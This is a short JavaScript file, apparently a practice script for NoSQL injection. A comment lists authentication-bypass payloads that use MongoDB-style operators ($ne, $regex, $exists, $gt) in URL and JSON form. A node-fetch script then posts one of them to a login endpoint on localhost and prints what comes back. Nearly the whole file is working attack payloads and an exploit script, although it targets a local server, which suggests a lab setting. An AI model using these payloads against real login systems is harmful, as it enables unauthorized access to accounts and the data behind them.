/* trying nosql injection 
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
*/

import fetch from "node-fetch";
let res = fetch("http://localhost:3000/user", {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({
        "email": {"$ne": null}, 
        "password": {"$ne": null}
    })
}).then((res)=>{
    return res.json();
}
).then((data)=>{
    console.log(data);
}
);